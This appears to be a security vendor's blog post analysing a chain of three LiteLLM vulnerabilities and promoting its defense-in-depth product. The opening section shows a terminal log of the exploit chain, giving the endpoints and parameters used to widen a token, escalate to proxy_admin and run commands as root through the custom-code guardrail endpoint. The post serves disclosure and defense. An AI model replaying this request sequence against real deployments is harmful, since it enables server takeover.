---
schema_version: "1.0.0"
document_id: "d56e7b7f383c0ef76985c78721b2639722c910f12040ef67ad83a596d3d2f36f"
company_key: "yc-miggos"
company: "Miggos"
source_id: "yc-miggos-news-import-47b875555782"
canonical_url: "https://www.miggo.io/post/defense-in-depth-in-action-how-to-stop-the-litellm-chain-cve-2026-47101-cve-2026-47102-cve-2026-40217-with-panache"
published_at: "2026-08-11T07:27:37.926+00:00"
first_seen_at: "2026-08-11T18:44:15.299660+00:00"
fetched_at: "2026-08-11T18:44:17.041020+00:00"
content_hash: "sha256:432b226616e5d8db8ad37a937fc0e8265dec88a84f5448b035ca5978988e430a"
---

# Defense-in-Depth in Action: How to Stop the LiteLLM Chain (CVE-2026-47101, CVE-2026-47102, CVE-2026-40217) with Panache

This is an image I’ve sent to our devops team a few times now. I’ve got it stored in my clipboard history for future use.


In this case, it was because of two three four[LiteLLM vulnerabilities that were published](https://www.obsidiansecurity.com/blog/litellm-privilege-escalation-rce) . They were all uniquely interesting: An authorization bypass, a privilege escalation, and two RCEs. Impressive indeed!


Obsidian Security’s writeup above does a great job of walking through the vulnerabilities themselves.


This blog will do a very speedy run over the **impact** of three of them and how they can be chained - for the rest, you should go read it! Kudos to them. What I want to do with you today is:


1. From hello to RCE
2. Talk about defense in depth as security practitioners, and show how it fits here
3. Show a demo we’ve made of Miggo handling this case
4. Go on a soapbox about the state of security in general


Let’s go!


## From hello to RCE


I’ll let the script talk:


```text
# talk to litellm   with   a strong token to mint a low-privilege one
❯ uv run ./mint_token.py
TOKEN=sk-gcxl2-gOCv_HE5hYCgSKug
USER_ID=574b1713-015c-44b6-aaa0-9ecfae0f1d5a


# run all three vulns   in   a chain
❯ ./chain.sh sk-gcxl2-gOCv_HE5hYCgSKug
[  47101  ] widen    POST /key/generate {  allowed_routes  :[  /*]}
patched/blocked -> continuing with supplied token
[47102] escalate POST /user/update user_role=proxy_admin  (user 574b1713-015c-44b6-aaa0-9ecfae0f1d5a)
/user/list -> 200 (200 = admin)
[40217] rce      POST /guardrails/test_custom_code  (id > /tmp/litellm-rce)
RCE OK


❯ k exec litellm -- cat /tmp/litellm-rce
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```


We’ve got:


1. 47101: A weak token with limited access is widened to have access to additional paths
2. 47102: This stronger token is still low-privileges - so we exchange it for an admin!
3. 40217: We use the admin token to run an RCE


Post-auth low-privilege -> RCE. Very cool.


## Defense-in-Depth Approach


There’s a tendency in the wider security and technical community to give a stink eye whenever a vulnerability is published. I’ve seen sentiments like:


- It’s just an info leak, who cares?
- A local privilege escalation doesn’t matter because an attacker with access to the system can already do whatever they want
- A 1-click RCE can never be exploited, who’s dumb enough to fall for a “click me” link that’s sent over SMS?
- Oh, this requires authentication, so it’s not a real vulnerability


The last one is what caught my attention. I’ve seen it said in response to the LiteLLM vulnerabilities above. It bugged me.


There’s some truth to downplaying some vulnerabilities: They sit on multiple spectrums of danger and impact, that’s why CVSS has scoring vectors, exploitability is an important factor, so on and so forth. But as a researcher (and more recently, someone who cares about the security of my org), I’ve had mixed feelings about these sentiments. Aside from being gatekeeper-ish (“oh you’re a security researcher? Name every vulnerability”) they also discount the **threat model** : How does **my** environment behave, and how can an attacker affect it?


Our threat model is different from yours. We’re a B2B SaaS running on a cloud, we’ve got applications that are purposefully open to the wider internet, alongside processes that go out and collect data. We’ve got sensors running in customer environments. We’ve got our CI/CD pipelines and our internal software stacks. Crucially, we give some of our partners access to some of our systems that can be considered internal - one of them being LiteLLM.


Is a post-auth attack on LiteLLM part of our threat model? It’s not at the top of my list, but it’s up there. I hope our partners won’t lose our tokens and won’t be affected by supply chain attacks, but I can never be sure, so yes, **I care about post-auth attacks on LiteLLM** . Another org, which only deploys LiteLLM internally behind seven VPNs - maybe they don’t care as much. That’s fair.


What I really like about the chain above is how…chainie it is. Let’s take the RCE and put it behind a high-privilege endpoint - it’s not too interesting. But chaining lower-impact vulnerabilities into a larger one is so often the game in security. If this interests you, look at some[pwn2own writeups](https://www.zerodayinitiative.com/blog/2020/3/20/pwn2own-day-two-results-and-master-of-pwn) for the juicy details - they’re wonderful in the scary sense.


Defense in depth comes from examining the threat model and how an attacker can get in, assuming they broke down whatever barriers they had until now, and figuring out how to stop them from getting another inch. Every vulnerability that you stack in front of another makes it so much harder to actually exploit and pull off.


## What does this have to do with protecting my organization?


Bringing us back to a threat model, there are two wider areas that interest us internally as well as showing up in pretty much every customer conversation. The industry is really afraid of:


- Just-released vulnerabilities that are getting sprayed: think[React2Shell](https://www.miggo.io/post/react2shell-cve-2025-55182-technical-breakdown) or Shellshock, those lovelies that show up in your access log
- Zero days in 1st and 3rd party code: think MoveIT before[Cl0p announced that they hacked everyone](https://www.miggo.io/post/how-to-detect-the-moveit-breach-with-opentelemetry#:~:text=After%20Progress%E2%80%99%20disclosure%2C%20the%20hacking%20group%20behind%20the%20breaches%20(Cl0p)%20pretty%20much%20issued%20an%20internet%2Dwide%20ransom%20notice%3A)


When these vulnerabilities dropped, we saw how[Miggo’s Defense-in-Depth](https://www.miggo.io/defense-in-depth-book-a-demo) solution could help on both counts:


- With the WAF copilot, customers use their existing security tooling to create rules for the privilege escalation. Once you know what to look for, it’s easily to block this attempt specifically while keeping regular traffic
- With the Miggo sensor, customers can both know and block the code execution, even before a CVE is released


This gives us two great points for Defense-in-Depth: Protect against what’s known while preparing for the worst.


This has been very courteous and nice so far, but I feel like there’s a growing feeling of frustration. No offense to this dev team or any other, writing software is hard, but I look at these vulnerabilities and just go…


## HOW!?


How are we still doing this?


How are we dealing with[“how”-worthy sql injections](https://docs.litellm.ai/blog/cve-2026-42208-litellm-proxy-sql-injection) when we’ve had prepared statements **in php** over 20 years now (remember` mysqli_real_escape_string` ?)


How do we still have[trivial XSSs in popular applications](https://muffin.ink/blog/scratch-vulnerability-disclosure/) ? We’ve had cure53 teaching us how to do this since like 2012.


How are we still[getting trivial command injections](https://www.rapid7.com/blog/post/ra-cve-2026-1731-analysis/) that any security scanner written after 2010 should pick up?


Now we’re adding to the mix[a trend](https://www.miggo.io/miggo-engineering-insights/detecting-copyfail-and-dirtyfrag-by-thinking-outside-the-box) of[local privilege escalations](https://www.miggo.io/miggo-engineering-insights/detecting-the-nftables-catchall-use-after-free-cve-2026-23111-by-thinking-outside-the-box) .


It’s not that it was never this bad - remember[when SSTIs](https://www.youtube.com/watch?v=3cT0uE7Y87s) dropped? Remember the before/after split of SQL injections!? The internet was suddenly open season. It was bad.


But it feels like we should be getting *better* . We’ll always have bugs, sure. If you get[a 10 page writeup by watchTowr](https://labs.watchtowr.com/why-use-app-level-auth-when-every-database-has-auth-splunk-enterprise-cve-2026-20253-pre-auth-rce/) (alongside[a handsome demo by Miggo](https://www.miggo.io/post/blind-the-watcher-stopping-the-unauthenticated-splunk-rce-cve-2026-20253-before-the-patch-lands) ) that’s one thing. Mistakes happen,[we sometimes forget to sync up our arrays](https://slcyber.io/research-center/exploit-brokers-pay-500000-for-a-wordpress-rce-i-found-one-with-gpt5-6#the-bug) , oopsies.


But the past two years felt…more. If beforehand we went around a house in shambles and were afraid that opening a door would leave us holding a doorknob, I’m now afraid that opening the rickety shed door will destabilise the integrity of the entire house and the neighbourhood and the Eurasian tectonic plate.


This isn’t quite the note that I want to end this piece on - not all is doom and gloom - but it sometimes feels like *ugh* .


(Pictured: Artax is me, the swamp is the security landscape, and I guess Atreyu is fruit loops?)


Until salvation or doom takes us all, here’s what I’m planning on doing:


- Implementing secure-by-default and defense-in-depth (which includes Miggo)
- Pushing for better security education - both defenders and individual researchers
- Limiting dependencies on 3rd parties


Got anything else that doesn’t involve *even more* fruit loops?[Let us know](https://www.miggo.io/defense-in-depth-book-a-demo) .


*Thanks to*[Nick Moore](https://github.com/kelnage) *for comments/corrections*


```text
<script src=  "https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"  ></script>
<  script     src  =  "https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/Flip.min.js"  >  </  script  >


<  script  >
document  .addEventListener(  "DOMContentLoaded"  ,   (  event  ) =>   {
gsap.registerPlugin(Flip);
const   state = Flip.getState(  ""  );
const   element =   document  .querySelector(  ""  );
element.classList.toggle(  ""  );
Flip.from(state, {
duration  :   0  ,
ease  :   "none"  ,
absolute  :   true  ,
});
});
</  script  >
```


```text


<  script  >
document  .addEventListener(  "DOMContentLoaded"  ,   (  event  ) =>   {
gsap.registerPlugin(Flip);
const   state = Flip.getState(  ""  );
const   element =   document  .querySelector(  ""  );
element.classList.toggle(  ""  );
Flip.from(state, {
duration  :   0  ,
ease  :   "none"  ,
absolute  :   true  ,
});
});
</  script  >
```
